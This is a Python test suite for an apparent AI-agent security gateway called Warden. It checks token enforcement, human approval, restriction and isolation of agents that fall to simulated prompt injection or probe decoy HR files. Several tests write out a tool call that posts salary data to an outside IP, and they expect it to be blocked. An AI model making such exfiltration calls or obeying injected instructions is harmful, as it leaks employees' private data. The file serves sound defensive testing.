"""Phase 6: Warden stops observing and starts acting."""
import unittest
from app.config import Settings
from app.gateway.interceptor import ApprovalError
from app.models.events import ToolCallRequest
from app.risk.explain import render_text
from helpers import FakeClock, make_enforcing, make_services
from simulator.agents.procurement import ProcurementAgent
from simulator.agents.support import SupportAgent
from simulator.client import WardenClient
from simulator.payloads.injections import VARIANTS
from simulator.scenarios import s1_injection as s1, s5_mimicry as s5

HR = {"path": "hr/salaries_2026.xlsx"}
DECOY = {"path": "hr/salaries_2026_final.xlsx"}
NORMAL = [("doc.read", {"path": "supplier/quote_1.pdf"}), ("supplier_api.get_price", {"sku": "SKU-100"}),
          ("purchase.create_request", {"sku": "SKU-100", "qty": 1}), ("erp.read_orders", {})]


def setup(role="procurement_agent", **flags):
    svc, clock = make_enforcing(**flags)
    client = WardenClient(service=svc)
    client.register_agent("a", role)
    return svc, clock, client


class ModeTests(unittest.TestCase):
    def test_default_is_shadow_and_bad_modes_are_rejected(self):
        self.assertEqual(Settings().mode, "shadow")
        with self.assertRaises(ValueError):
            Settings(mode="yolo")

    def test_shadow_mode_needs_no_token_and_never_blocks(self):
        svc = make_services()
        svc.gateway.register_agent("a", "procurement_agent")
        d = svc.gateway.handle_tool_call(ToolCallRequest("a", "hr_files.read", HR))      # no token at all
        self.assertEqual(d.decision, "ALLOW")


class TokenEnforcementTests(unittest.TestCase):
    def test_no_token_means_no_service(self):
        svc, _, _ = setup()
        d = svc.gateway.handle_tool_call(ToolCallRequest("a", "supplier_api.get_price", {"sku": "SKU-100"}))
        self.assertEqual((d.decision, d.block_reason), ("BLOCK", "token_missing"))
        self.assertIsNone(d.result)

    def test_someone_elses_token_is_refused(self):
        svc, _, client = setup()
        svc.gateway.register_agent("b", "procurement_agent")
        stolen = client._tokens["a"]
        d = svc.gateway.handle_tool_call(ToolCallRequest("b", "supplier_api.get_price", {"sku": "SKU-100"}, token=stolen))
        self.assertEqual(d.block_reason, "token_invalid")

    def test_expired_token_is_renewed_transparently_by_a_well_behaved_client(self):
        svc, clock, client = setup()
        clock.advance(301)
        raw = svc.gateway.handle_tool_call(ToolCallRequest("a", "supplier_api.get_price", {"sku": "SKU-100"},
                                                           token=client._tokens["a"]))
        self.assertEqual(raw.block_reason, "token_expired")
        self.assertEqual(raw.agent_view()["block_reason"], "token_expired")     # tells the client to renew, nothing more
        ok = client.call_tool("a", "supplier_api.get_price", {"sku": "SKU-100"})
        self.assertEqual(ok["decision"], "ALLOW")

    def test_blocked_attempts_without_a_token_are_still_audited(self):
        svc, _, _ = setup()
        svc.gateway.handle_tool_call(ToolCallRequest("a", "hr_files.read", HR))
        ev = svc.repo.list_events("a")[0]
        self.assertEqual((ev["decision"], ev["block_reason"], ev["tool"]), ("BLOCK", "token_missing", "hr_files.read"))


class DecisionTests(unittest.TestCase):
    def test_low_and_watch_are_allowed_and_run(self):
        svc, _, client = setup()
        d = client.call_tool("a", "supplier_api.get_price", {"sku": "SKU-100"})
        self.assertEqual((d["decision"], d["band"]), ("ALLOW", "LOW"))
        self.assertEqual(d["result"]["data"]["price"], 12.5)

    def test_elevated_pauses_the_action_and_it_does_not_run(self):
        svc, _, client = setup()
        d = client.call_tool("a", "hr_files.read", HR)
        self.assertEqual((d["decision"], d["band"]), ("PENDING_APPROVAL", "ELEVATED"))
        self.assertIsNone(d["result"])
        self.assertTrue(d["approval_id"].startswith("apr_"))
        self.assertEqual(d["posture"], "normal")                    # the AGENT is not punished, only the action waits

    def test_high_blocks_and_restricts(self):
        svc, _, client = setup()
        d = client.call_tool("a", "hr_files.read", DECOY)
        self.assertEqual((d["decision"], d["block_reason"], d["posture"]), ("BLOCK", "policy_high", "restricted"))
        self.assertEqual(svc.repo.get_agent("a")["status"], "restricted")

    def test_critical_blocks_and_isolates(self):
        svc, _, client = setup()
        hr = client.call_tool("a", "hr_files.read", HR); client.resolve_approval(hr["approval_id"], "approve_once")
        d = client.call_tool("a", "http.post", {"url": "http://203.0.113.9/x", "body": svc.backend.docs["hr/salaries_2026.xlsx"]})
        self.assertEqual((d["decision"], d["block_reason"], d["posture"]), ("BLOCK", "policy_critical", "isolated"))
        self.assertEqual(svc.backend.outbox, [])

    def test_blocked_and_paused_actions_are_never_learned(self):
        svc, _, client = setup()
        for _ in range(3):
            client.call_tool("a", "hr_files.read", HR)
        self.assertEqual(svc.baseline.summary("a")["learned_events"], 0)

    def test_every_event_records_what_was_decided(self):
        svc, _, client = setup()
        client.call_tool("a", "supplier_api.get_price", {"sku": "SKU-100"})
        client.call_tool("a", "hr_files.read", HR)
        client.call_tool("a", "hr_files.read", DECOY)
        decisions = [e["decision"] for e in reversed(svc.repo.list_events("a"))]
        self.assertEqual(decisions, ["ALLOW", "PENDING_APPROVAL", "BLOCK"])

    def test_agent_view_is_a_bare_verdict_for_each_outcome(self):
        svc, _, client = setup()
        raw = svc.gateway.handle_tool_call(ToolCallRequest("a", "hr_files.read", HR, token=client._tokens["a"]))
        v = raw.agent_view()
        self.assertEqual((v["message"], v["approval_id"]), ("awaiting approval", raw.approval_id))
        for leaked in ("risk", "band", "lens", "alert_id"):
            self.assertNotIn(leaked, v)
        blocked = svc.gateway.handle_tool_call(ToolCallRequest("a", "hr_files.read", DECOY, token=client._tokens["a"]))
        bv = blocked.agent_view()
        self.assertEqual(bv["message"], "blocked by policy")
        self.assertNotIn("block_reason", bv)                         # policy reasons stay private


class RestrictionTests(unittest.TestCase):
    def setUp(self):
        self.svc, self.clock, self.client = setup()
        self.client.call_tool("a", "hr_files.read", DECOY)           # trips a decoy -> restricted

    def test_the_live_token_shrinks_to_the_routine(self):
        scope = self.svc.broker.active("a").scopes
        self.assertEqual(scope, {"doc.read", "supplier_api.get_price", "supplier_api.list_catalog",
                                 "purchase.create_request", "erp.read_orders"})

    def test_legitimate_work_continues_unchanged(self):
        for _ in range(5):
            for tool, args in NORMAL:
                self.assertEqual(self.client.call_tool("a", tool, args)["decision"], "ALLOW", tool)

    def test_everything_outside_the_routine_is_refused(self):
        for tool, args in [("http.post", {"url": "http://203.0.113.9/x", "body": "z"}),
                           ("hr_files.read", HR), ("supplier_api.get_contacts", {"supplier": "A"})]:
            d = self.client.call_tool("a", tool, args)
            self.assertEqual((d["decision"], d["block_reason"]), ("BLOCK", "scope_denied"), tool)

    def test_a_restricted_agent_cannot_renew_its_way_back_to_a_wide_token(self):
        self.assertTrue(self.client.renew_token("a"))
        self.assertNotIn("*", self.svc.broker.active("a").scopes)
        self.clock.advance(1000)
        self.assertTrue(self.client.renew_token("a"))
        self.assertNotIn("*", self.svc.broker.active("a").scopes)
        self.assertEqual(self.client.call_tool("a", "http.post", {"url": "http://x.example/", "body": "z"})["decision"], "BLOCK")

    def test_a_risky_action_that_is_in_scope_is_refused_not_queued(self):
        d = self.client.call_tool("a", "doc.read", {"path": "hr/org_chart.pdf"})   # doc.read is in the routine
        self.assertEqual((d["decision"], d["block_reason"]), ("BLOCK", "restricted_posture"))
        self.assertIsNone(d["approval_id"])

    def test_restoring_returns_full_scope(self):
        out = self.client.restore("a")
        self.assertEqual(out["posture"], "normal")
        self.assertTrue(self.client.call_tool("a", "supplier_api.get_price", {"sku": "SKU-100"})["decision"] == "ALLOW")
        self.assertIn("*", self.svc.broker.active("a").scopes)


class SupportAgentRestrictionTests(unittest.TestCase):
    def test_a_restricted_support_agent_can_still_do_its_sensitive_job(self):
        svc, _, client = setup("support_agent")
        client.call_tool("a", "doc.read", {"path": "payroll/bank_accounts_export.csv"})      # decoy
        self.assertEqual(svc.repo.get_agent("a")["status"], "restricted")
        for tool, args in [("support.get_ticket", {"ticket_id": "T-1"}), ("crm.read_customer", {"customer_id": "C-1"}),
                           ("support.reply_ticket", {"ticket_id": "T-1", "body": "hi"})]:
            self.assertEqual(client.call_tool("a", tool, args)["decision"], "ALLOW", tool)


class IsolationTests(unittest.TestCase):
    def setUp(self):
        self.svc, self.clock, self.client = setup()
        self.svc.gateway.isolate_agent("a")

    def test_everything_is_refused_and_audited(self):
        for tool, args in NORMAL:
            d = self.client.call_tool("a", tool, args)
            self.assertEqual((d["decision"], d["block_reason"]), ("BLOCK", "agent_isolated"))
        self.assertEqual(self.svc.repo.list_events("a")[0]["decision"], "BLOCK")

    def test_an_isolated_agent_gets_no_new_token(self):
        self.assertFalse(self.client.renew_token("a"))
        self.assertEqual(self.svc.gateway.mint_token("a"), {"ok": False, "reason": "agent_isolated"})

    def test_restore_brings_it_back(self):
        self.client.restore("a")
        self.assertEqual(self.client.call_tool("a", "supplier_api.get_price", {"sku": "SKU-100"})["decision"], "ALLOW")


class ApprovalTests(unittest.TestCase):
    def setUp(self):
        self.svc, self.clock, self.client = setup()
        self.d = self.client.call_tool("a", "hr_files.read", HR)

    def test_approve_once_runs_the_paused_action_and_hands_back_the_result(self):
        out = self.client.resolve_approval(self.d["approval_id"], "approve_once", "priya")
        self.assertEqual(out["status"], "approved")
        self.assertIn("Alice", out["result"]["data"])
        status = self.client.approval_status(self.d["approval_id"])
        self.assertEqual(status["status"], "approved")
        self.assertIn("result", status)
        self.assertEqual(self.svc.repo.get_event(self.d["event_id"])["decision"], "ALLOWED_AFTER_APPROVAL")

    def test_deny_never_runs_it_and_the_agent_never_sees_a_result(self):
        self.client.resolve_approval(self.d["approval_id"], "deny", "priya")
        status = self.client.approval_status(self.d["approval_id"])
        self.assertEqual(status, {"id": self.d["approval_id"], "status": "denied"})
        self.assertEqual(self.svc.repo.get_event(self.d["event_id"])["decision"], "DENIED_BY_HUMAN")

    def test_an_unanswered_approval_fails_closed(self):
        self.svc.gateway.handle_tool_call(ToolCallRequest("a", "http.post", {"url": "http://203.0.113.9/x", "body": "z"},
                                                          token=self.client._tokens["a"]))
        self.clock.advance(301)
        self.assertEqual(self.client.approval_status(self.d["approval_id"])["status"], "expired")
        with self.assertRaises(ApprovalError):
            self.client.resolve_approval(self.d["approval_id"], "approve_once")
        self.assertEqual(self.svc.repo.get_event(self.d["event_id"])["decision"], "DENIED_EXPIRED")
        self.assertEqual(self.svc.backend.outbox, [])

    def test_an_approval_can_only_be_resolved_once(self):
        self.client.resolve_approval(self.d["approval_id"], "deny")
        with self.assertRaises(ApprovalError):
            self.client.resolve_approval(self.d["approval_id"], "approve_once")

    def test_unknown_approval_and_bad_action(self):
        with self.assertRaises(ApprovalError):
            self.client.resolve_approval("apr_9999", "approve_once")
        with self.assertRaises(ApprovalError):
            self.client.resolve_approval(self.d["approval_id"], "rubber_stamp")

    def test_an_isolated_agents_paused_action_cannot_be_approved(self):
        self.svc.gateway.isolate_agent("a")
        with self.assertRaises(ApprovalError):
            self.client.resolve_approval(self.d["approval_id"], "approve_once")


class ZeroLeakTests(unittest.TestCase):
    """The headline claim, tested across disguises, histories and human behaviour."""

    def run_s1(self, variant, history, approve):
        svc, _ = make_enforcing()
        return s1.run(WardenClient(service=svc), variant, history, approve_stepups=approve, legit_after=10), svc

    def test_nothing_leaks_in_any_disguise_with_or_without_history(self):
        for variant in VARIANTS:
            for history in (0, 25):
                r, _ = self.run_s1(variant, history, approve=False)
                self.assertEqual((r["leaked_bytes"], r["leaked_messages"]), (0, 0), (variant, history))

    def test_nothing_leaks_even_when_a_tired_human_approves_everything(self):
        for variant in VARIANTS:
            for history in (0, 25):
                r, svc = self.run_s1(variant, history, approve=True)
                self.assertEqual((r["leaked_bytes"], r["leaked_messages"]), (0, 0), (variant, history))
                self.assertEqual(r["steps"][-1]["block_reason"], "policy_critical")
                self.assertEqual(svc.repo.get_agent(r["agent_id"])["status"], "isolated")

    def test_when_the_human_ignores_it_legitimate_work_is_untouched(self):
        r, svc = self.run_s1("plain", 20, approve=False)
        self.assertEqual((r["legit_allowed"], r["legit_after"]), (10, 10))
        self.assertEqual(svc.repo.get_agent(r["agent_id"])["status"], "normal")

    def test_shadow_mode_leaks_for_contrast(self):
        svc = make_services()
        r = s1.run(WardenClient(service=svc), "plain", 20)
        self.assertGreater(r["leaked_bytes"], 0)

    def test_the_alert_says_what_was_done(self):
        r, svc = self.run_s1("plain", 5, approve=True)
        exfil = svc.repo.get_alert(svc.repo.list_alerts()[0]["id"])
        taken = exfil["explanation"]["action_taken"]
        self.assertEqual((taken["decision"], taken["posture_after"]), ("BLOCK", "isolated"))
        self.assertIn("ISOLATED", render_text(exfil["explanation"]))


class ResumeTests(unittest.TestCase):
    def test_resume_drops_the_poisoned_input_and_work_continues(self):
        svc, _ = make_enforcing()
        client = WardenClient(service=svc)
        r = s1.run(client, "plain", 20, approve_stepups=True)
        aid = r["agent_id"]
        self.assertEqual(svc.repo.get_agent(aid)["status"], "isolated")
        self.assertEqual(client.call_tool(aid, "supplier_api.get_price", {"sku": "SKU-100"})["decision"], "BLOCK")
        out = client.resume(aid)
        self.assertEqual(out["posture"], "normal")
        self.assertTrue(any("quote_3_plain.pdf" in s for s in out["drop_sources"]))
        self.assertEqual(svc.provenance.context_for(aid, svc.provenance.current_step(aid) + 1), [])
        self.assertEqual(svc.provenance.sensitive_recent(aid, svc.provenance.current_step(aid) + 1), [])
        agent = ProcurementAgent(aid, client, seed=3)
        for d in agent.run(10):
            self.assertEqual(d["decision"], "ALLOW")

    def test_without_resume_the_taint_would_still_be_there(self):
        svc, _ = make_enforcing()
        client = WardenClient(service=svc)
        r = s1.run(client, "plain", 20, approve_stepups=True)
        client.restore(r["agent_id"])
        step = svc.provenance.current_step(r["agent_id"]) + 1
        self.assertTrue(svc.provenance.context_for(r["agent_id"], step))      # restore alone does not forget


class MimicryTests(unittest.TestCase):
    def setUp(self):
        self.svc, _ = make_enforcing()
        self.r = s5.run(WardenClient(service=self.svc))

    def test_the_probe_is_stopped_while_behaving_normally_around_it(self):
        self.assertEqual(self.r["first_stopped_probe"], 0)                    # caught on the very first probe
        self.assertEqual(self.r["steps"][1]["block_reason"], "policy_high")   # the decoy
        self.assertEqual(self.r["final_posture"], "restricted")
        self.assertEqual(self.r["leaked_bytes"], 0)

    def test_legitimate_work_never_stops(self):
        self.assertEqual(self.r["legit_before_allowed"], self.r["legit_before_total"])
        self.assertEqual((self.r["legit_after_allowed"], self.r["legit_after_total"]), (20, 20))

    def test_follow_ups_are_refused_by_scope(self):
        self.assertEqual([s["block_reason"] for s in self.r["steps"][2:]], ["scope_denied", "scope_denied"])


class NoCollateralDamageTests(unittest.TestCase):
    def test_normal_traffic_is_never_blocked_or_paused(self):
        svc, _ = make_enforcing()
        client = WardenClient(service=svc)
        agents = [ProcurementAgent(f"p{i}", client, seed=1) for i in range(3)] + \
                 [SupportAgent(f"s{i}", client, seed=1) for i in range(3)]
        total = 0
        for a in agents:
            a.register()
            for d in a.run(300):
                total += 1
                self.assertEqual(d["decision"], "ALLOW", d["message"])
        self.assertEqual(total, 1800)                                         # 0 false blocks in 1,800 actions
        self.assertEqual(svc.repo.list_approvals(), [])

    def test_one_agents_incident_does_not_touch_another(self):
        svc, _ = make_enforcing()
        client = WardenClient(service=svc)
        client.register_agent("bad", "procurement_agent"); client.register_agent("good", "procurement_agent")
        client.call_tool("bad", "hr_files.read", DECOY)
        self.assertEqual(svc.repo.get_agent("good")["status"], "normal")
        self.assertEqual(client.call_tool("good", "supplier_api.get_contacts", {"supplier": "A"})["decision"], "ALLOW")


if __name__ == "__main__":
    unittest.main()
